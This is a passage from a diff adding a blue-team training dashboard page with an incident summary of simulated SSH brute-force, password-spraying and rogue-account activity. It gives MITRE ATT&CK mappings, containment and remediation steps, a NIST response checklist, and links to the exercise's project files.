+| Account | `mallory` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `oscar` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `peggy` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `trent` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `victor` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `walter` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `arjun` | Repeated failed sudo (local privilege-escalation probing) | Force password reset; monitor |
+
+## 5. MITRE ATT&amp;CK
+
+- T1078 Valid Accounts
+- T1087 Account Discovery
+- T1098 Account Manipulation
+- T1105 Ingress Tool Transfer
+- T1110.001 Password Guessing
+- T1110.003 Password Spraying
+- T1136.001 Create Account: Local
+- T1548 Abuse Elevation Control Mechanism
+- T1548.003 Sudo and Sudo Caching
+
+## 6. Recommended actions per finding
+
+| ID | Sev | Finding | Action |
+|---|---|---|---|
+| F03 | CRITICAL | Successful login after failure burst (likely compromised credential) | Isolate host from network; disable/reset the account; kill active sessions (`who`, `pkill -KILL -u &lt;user&gt;`); preserve /var/log and shell history; hunt for follow-on activity from the same source IP. |
+| F10 | CRITICAL | Account added to privileged group | Remove the account from the group immediately (`gpasswd -d &lt;user&gt; sudo`); check /etc/sudoers.d for drop-ins; audit all commands run by the account. |
+| F01 | HIGH | SSH brute force (many failures from one source) | Block source IP at perimeter firewall/fail2ban; enforce key-only SSH (`PasswordAuthentication no`); rate-limit port 22; check whether the IP appears in other logs. |
+| F09 | HIGH | New local account created | Confirm against change management; if unapproved, lock (`usermod -L`) and expire the account; check for SSH keys planted in its home directory. |
+| F08 | HIGH | Privileged command fetched/staged a remote payload | Hash and quarantine the dropped file (`sha256sum /tmp/x.sh`); check crontab/systemd for persistence; block the payload host; do NOT execute the file. |
+| F02 | HIGH | Password spraying (one source, many accounts) | Block source IP; force password reset for any account that later succeeded; enable account lockout / MFA; review password policy for the sprayed user list. |
+| F06 | HIGH | Repeated failed sudo (local privilege-escalation probing) | Interview the user&#x27;s manager; check whether the account is shared; review sudoers grants for least privilege; enable sudo I/O logging. |
+| F04 | MEDIUM | Privileged account login outside business hours | Confirm with the account owner; if unconfirmed, treat as part of the compromise chain; add a time-based alert rule for privileged logins. |
+| F05 | MEDIUM | Username enumeration / invalid-user probing | Block source IP; ensure sshd returns identical responses for valid/invalid users (default in modern OpenSSH); add IP to watchlist. |
+| F07 | MEDIUM | su to root attempted | Verify with the user; if unexplained, treat as credential misuse; restrict `su` to the wheel group in /etc/pam.d/su. |
+
+## 7. Response checklist (NIST SP 800-61)
+
+**Containment**
+- [ ] Block attacker IPs at firewall
+- [ ] Isolate affected host from production VLAN
+- [ ] Disable compromised + rogue accounts
+- [ ] Kill active attacker sessions
+
+**Eradication**
+- [ ] Remove rogue account and sudo grant
+- [ ] Delete dropped files (/tmp/x.sh) after hashing
+- [ ] Rotate root and all local passwords; enforce SSH keys
+- [ ] Patch and re-baseline sshd/sudo configuration
+
+**Recovery**
+- [ ] Restore host from known-good image if root was compromised
+- [ ] Re-enable monitoring; add detection rules for the observed pattern
+- [ ] Monitor for 14 days for re-entry from the same IOCs
+
+**Lessons learned**
+- [ ] Why was password auth for root enabled?
+- [ ] Why did 37 failures not trigger fail2ban?
+- [ ] Add off-hours privileged-login alert
+
+## 8. Escalation decision
+
+Priority **P1** → notify **SOC Lead + IR Manager + system owner; page on-call** within **15 min**. Open a ticket, attach this summary and the raw log, and hand over with the checklist above.
+</div></div>
+<div class="pane" id="pane-shots"><h2>Screenshots (rendered from the captured runs)</h2>
+<h3>Project 01</h3><img src="../project-01/screenshots/01_generate_lab_data_and_run.png" alt="P01 run"><img src="../project-01/screenshots/02_unit_tests_13_pass.png" alt="P01 tests"><img src="../project-01/screenshots/03_edge_cases_thresholds_and_garbage_input.png" alt="P01 edge cases">
+<h3>Project 02</h3><img src="../project-02/screenshots/01_generate_incident_summary.png" alt="P02 run"><img src="../project-02/screenshots/02_unit_tests_12_pass.png" alt="P02 tests"><img src="../project-02/screenshots/03_markdown_summary_head.png" alt="P02 md"><img src="../project-02/screenshots/04_html_incident_ticket.png" alt="P02 html ticket"></div>
+<div class="pane" id="pane-files"><h2>All files</h2><div class="grid">
+<div class="card"><b>Project 01</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/README.md">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/report.md">report.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/src/auth_investigator.py">src/auth_investigator.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/data/make_lab_data.py">data/make_lab_data.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/data/auth.log">data/auth.log</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/tests/test_auth_investigator.py">tests/test_auth_investigator.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/evidence/terminal_output.txt">evidence/terminal_output.txt</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/evidence/findings.json">evidence/findings.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/evidence/findings.md">evidence/findings.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/screenshots">screenshots/</a></div>
+<div class="card"><b>Project 02</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/README.md">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/report.md">report.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/src/incident_summary.py">src/incident_summary.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/data/findings.json">data/findings.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/data/alerts_sample.csv">data/alerts_sample.csv</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/tests/test_incident_summary.py">tests/test_incident_summary.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/evidence/terminal_output.txt">evidence/terminal_output.txt</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/evidence/incident_summary.md">evidence/incident_summary.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/evidence/incident_summary.html">evidence/incident_summary.html</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/evidence/incident_summary.json">evidence/incident_summary.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/screenshots">screenshots/</a></div>
+<div class="card"><b>Root</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/README.md">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/STEP_BY_STEP.md">STEP_BY_STEP.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/PUSH_TO_GITHUB.md">PUSH_TO_GITHUB.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/docs/render_screens.py">docs/render_screens.py</a></div></div></div>
+</main><footer>Eswar Mahalingam · Blue Team Operator &amp; Trainee · GS-STU-DSOU-2026-039A · Assigned → Built → Tested → Documented → Published → Proven</footer>
+<script>const N=9,boxes=[...document.querySelectorAll('.chk input')];function load(){let s={};try{s=JSON.parse(localStorage.getItem('gs_day1')||'{}')}catch(e){}boxes.forEach(b=>{b.checked=!!s[b.dataset.k];b.closest('.step').classList.toggle('done',b.checked)});upd()}
+function upd(){const n=boxes.filter(b=>b.checked).length;document.getElementById('pct').textContent=n+' / '+N+' verified'+(n===N?' — all proven ✅':'');document.getElementById('fill').style.width=(100*n/N)+'%'}
+boxes.forEach(b=>b.addEventListener('change',()=>{const s={};boxes.forEach(x=>s[x.dataset.k]=x.checked);try{localStorage.setItem('gs_day1',JSON.stringify(s))}catch(e){}b.closest('.step').classList.toggle('done',b.checked);upd()}));
+document.getElementById('reset').onclick=e=>{e.preventDefault();try{localStorage.removeItem('gs_day1')}catch(x){}load()};
+function show(p){document.querySelectorAll('.pane').forEach(x=>x.classList.toggle('on',x.id==='pane-'+p));document.querySelectorAll('.tabs a').forEach(a=>a.classList.toggle('on',a.dataset.p===p))}
+document.querySelectorAll('.tabs a').forEach(a=>a.onclick=e=>{e.preventDefault();show(a.dataset.p);location.hash=a.dataset.p});if(location.hash&&document.getElementById('pane-'+location.hash.slice(1)))show(location.hash.slice(1));load();</script></body></html>
